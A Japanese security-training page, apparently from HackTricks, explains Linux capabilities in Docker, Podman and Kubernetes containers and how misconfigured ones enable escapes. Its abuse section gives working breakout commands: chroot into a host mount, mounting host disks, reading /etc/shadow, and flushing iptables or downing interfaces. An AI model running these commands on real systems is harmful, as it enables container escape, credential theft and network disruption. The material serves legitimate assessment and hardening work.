# コンテナ内の Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities は、コンテナ security における最も重要な要素の1つです。なぜなら、微妙ですが根本的な問い、つまり **コンテナ内での「root」とは本当は何を意味するのか** に答えるものだからです。通常の Linux system では、歴史的に UID 0 は非常に広範な privilege set を意味していました。現代の kernel では、この privilege は capabilities と呼ばれる、より小さな単位に分解されています。関連する capabilities が削除されていれば、process は root として実行されていても、多くの強力な操作を実行できません。

Containers は、この区別に大きく依存しています。互換性や簡便性の理由から、多くの workload は今でも container 内で UID 0 として起動されます。capability dropping がなければ、これは非常に危険です。capability dropping を行えば、containerized root process は通常の container 内タスクの多くを実行しつつ、より機密性の高い kernel 操作は拒否されます。したがって、container shell に `uid=0(root)` と表示されても、それだけで「host root」や、さらには「広範な kernel privilege」を意味するわけではありません。その root identity が実際にどれほどの価値を持つかは、capability sets によって決まります。

Linux capability の完全なリファレンスと、多数の abuse 例については、以下を参照してください。

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 操作

Capabilities は、permitted、effective、inheritable、ambient、bounding sets など、複数の set で追跡されます。多くの container assessment では、各 set の正確な kernel semantics よりも、次の実践的な問いのほうが直ちに重要です。**この process は現在、どの privileged operation を正常に実行でき、将来的にどの privilege gain がまだ可能なのか？**

これが重要なのは、多くの breakout technique が、実際には container の問題に見せかけた capability の問題だからです。`CAP_SYS_ADMIN` を持つ workload は、通常の container root process が触れるべきではない、膨大な kernel functionality にアクセスできます。`CAP_NET_ADMIN` を持つ workload は、host network namespace も共有している場合、さらに危険になります。`CAP_SYS_PTRACE` を持つ workload は、host PID sharing によって host process を認識できる場合、より興味深い対象になります。Docker や Podman では、これは `--pid=host` として現れることがあります。Kubernetes では通常、`hostPID: true` として現れます。

つまり、capability set は単独で評価できません。namespaces、seccomp、MAC policy と合わせて読み取る必要があります。

## Lab

container 内で capabilities を確認する非常に直接的な方法は次のとおりです。
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
より制限の厳しいコンテナと、すべての capabilities が追加されたコンテナを比較することもできます。
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
限定的な追加の効果を確認するには、いったんすべてを削除し、1つの capability だけを追加し直してみます：
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
これらの小さな実験は、runtime が単に "privileged" という boolean を切り替えているだけではないことを示すのに役立ちます。runtime は、process で実際に利用可能な privilege surface を形成しています。

## High-Risk Capabilities

target によっては多くの capabilities が重要になりますが、container escape analysis で繰り返し関連するものがいくつかあります。

**`CAP_SYS_ADMIN`** は、defender が最も警戒すべきものです。mount 関連の操作、namespace に依存する挙動、その他 container に不用意に公開すべきではない多数の kernel paths など、膨大な機能を有効にするため、しばしば "the new root" と表現されます。container に `CAP_SYS_ADMIN`、弱い seccomp、そして強力な MAC confinement がない場合、多くの classic breakout paths が現実的になります。

**`CAP_SYS_PTRACE`** は、process visibility が存在する場合、特に PID namespace が host または関心対象となる近隣の workload と共有されている場合に重要です。visibility を tampering に変える可能性があります。

**`CAP_NET_ADMIN`** と **`CAP_NET_RAW`** は、network に重点を置く環境で重要です。isolated bridge network 上でもすでに危険になり得ますが、shared host network namespace 上ではさらに危険です。これは workload が host networking を再設定したり、sniff、spoof、または local traffic flows に干渉したりできる可能性があるためです。

**`CAP_SYS_MODULE`** は、kernel modules の loading が実質的に host-kernel control となるため、rootful environment では通常 catastrophic です。general-purpose container workload に登場することは、ほぼ避けるべきです。

## Runtime Usage

Docker、Podman、containerd-based stacks、CRI-O はすべて capability controls を使用しますが、defaults と management interfaces は異なります。Docker では `--cap-drop` や `--cap-add` などの flags を通じて非常に直接的に公開されています。Podman でも同様の controls が公開されており、rootless execution を追加の safety layer として利用できることがよくあります。Kubernetes では、Pod または container の `securityContext` を通じて capability additions と drops を設定します。LXC/Incus などの system-container environments も capability control に依存していますが、これらの system の広範な host integration によって、operators は app-container environment よりも積極的に defaults を緩和しがちです。

同じ原則はすべてに当てはまります。技術的に grant 可能な capability が、必ずしも grant すべきものとは限りません。現実の多くの incidents は、workload がより厳格な configuration で失敗し、team が quick fix を必要としたため、operator が namespace、seccomp、mount の implications を理解しないまま capability を追加したときに始まります。

## Misconfigurations

最も明白な mistake は Docker/Podman-style CLIs における **`--cap-add=ALL`** ですが、これだけではありません。実際には、非常に powerful な capabilities を 1 つまたは 2 つ grant することのほうが、より一般的な問題です。特に `CAP_SYS_ADMIN` を、namespace、seccomp、mount の implications を理解しないまま "make the application work" のために grant するケースです。もう 1 つの common failure mode は、extra capabilities と host namespace sharing を組み合わせることです。Docker または Podman では、これは `--pid=host`、`--network=host`、`--userns=host` として現れることがあります。Kubernetes では、通常 `hostPID: true` や `hostNetwork: true` などの workload settings を通じて同等の exposure が発生します。これらの各 combination によって、capability が実際に影響を与えられる対象が変わります。

また、workload が完全な `--privileged` ではないため、依然として意味のある constraint があると administrators が考えることもよくあります。それが正しい場合もありますが、effective posture がすでに privileged に十分近く、operational にはその違いが意味を失っている場合もあります。

## Abuse

最初の practical step は、effective capability set を enumerate し、escape または host information access に関係する capability-specific actions を直ちに test することです。
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN` が存在する場合は、mount-based abuse とホストファイルシステムへのアクセスを最初にテストしてください。これは最も一般的な breakout enabler の1つです。
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE` が存在し、container から興味深いプロセスを確認できる場合は、その capability をプロセス検査に利用できるか確認します：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合、ワークロードが可視ネットワークスタックを操作できるか、少なくとも有用なネットワーク情報を収集できるかをテストします：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Capability test が成功したら、それを namespace の状況と組み合わせて評価します。分離された namespace 内では単にリスクがあるように見える capability でも、container が host PID、host network、または host mounts を共有している場合、直ちに escape や host-recon primitive になり得ます。

### 完全な例: `CAP_SYS_ADMIN` + Host Mount = Host Escape

container に `CAP_SYS_ADMIN` と、`/host` のような host filesystem の writable bind mount がある場合、escape path は多くの場合、単純です:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
`chroot`が成功すると、コマンドはホストのルートファイルシステムコンテキストで実行されるようになります:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot` が利用できない場合、マウントされたツリーを通じてバイナリを呼び出すことで、同じ結果を達成できることがよくあります：
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完全な例: `CAP_SYS_ADMIN` + デバイスアクセス

ホストのブロックデバイスが公開されている場合、`CAP_SYS_ADMIN` によってホストのファイルシステムへ直接アクセスできるようになります:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完全な例: `CAP_NET_ADMIN` + Host Networking

この組み合わせは常に直接 host root を取得できるとは限りませんが、host の network stack を完全に再構成できます:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
それにより、denial of service、トラフィックの傍受、または以前はフィルタリングされていたサービスへのアクセスが可能になります。

## チェック

capability checks の目的は、単に生の値をダンプすることではなく、プロセスに現在の namespace と mount の状況を危険なものにするのに十分な権限があるかどうかを理解することです。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
ここで興味深い点：

- `capsh --print` は、`cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、`cap_sys_module` などの高リスクな capabilities を確認する最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行は、他のセットで利用できる可能性があるものではなく、現在実際に有効なものを示します。
- コンテナが host PID、network、user namespaces を共有している場合、または書き込み可能な host mounts がある場合、capability dump はさらに重要になります。

raw capability 情報を収集した後は、解釈に進みます。プロセスが root か、user namespaces が有効か、host namespaces が共有されているか、seccomp が enforcing か、AppArmor または SELinux が引き続きプロセスを制限しているかを確認します。capability set だけでは全体の一部にすぎませんが、同じように見える開始点から、ある container breakout が成功し、別のものが失敗する理由を説明する要素になることがよくあります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker は capabilities の default allowlist を維持し、それ以外を drop します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | Reduced capability set by default | Podman containers はデフォルトで unprivileged であり、reduced capability model を使用します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | `securityContext.capabilities` が指定されていない場合、container は runtime の default capability set を取得します | `securityContext.capabilities.add`、`drop: [\"ALL\"]` を指定しないこと、`privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | effective set は runtime と Pod spec の組み合わせによって決まります | Kubernetes の行と同じ。直接の OCI/CRI configuration で capabilities を明示的に追加することもできます |

Kubernetes で重要なのは、API が universal な default capability set を1つ定義しているわけではないという点です。Pod が capabilities を add または drop しない場合、workload はその node の runtime default を継承します。

{{#include ../../../../banners/hacktricks-training.md}}
